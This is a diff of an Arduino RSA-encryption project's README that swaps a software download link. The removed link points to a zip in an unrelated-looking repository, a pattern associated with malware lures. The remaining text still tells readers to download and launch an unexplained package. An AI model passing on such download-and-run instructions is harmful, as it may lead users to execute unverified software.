@@ -22,7 +22,7 @@ This repository focuses on implementing RSA encryption on Arduino with a graphic
 ## Software
 📦 Click the button below to download the software package needed to run the project:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/SimplyDiget/rsa_arduino_gui/releases/download/v1.0/Application.zip)](https://github.com/SimplyDiget/rsa_arduino_gui/releases/download/v1.0/Application.zip)
 
 (The software package needs to be launched to access the project files and functionalities.)
 
